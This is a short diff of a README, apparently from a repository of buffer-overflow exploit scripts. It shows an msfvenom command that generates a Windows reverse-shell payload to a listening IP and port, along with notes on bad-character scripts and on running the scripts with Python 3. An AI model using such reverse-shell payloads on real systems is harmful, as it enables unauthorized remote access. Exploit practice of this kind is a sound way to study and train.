@@ -26,4 +26,6 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<The-Listening-ip> LPORT=<Listening-
 
   *The badChars scripts present in each overflow directory contains a badChars variable from which also badchars specific to the overflow have been eliminated* 
   
+ **scripts are to be run with python but you may adjust some encoding in place to make them work with python3** 
+ 
 **Other Overflows will be added as I do them**
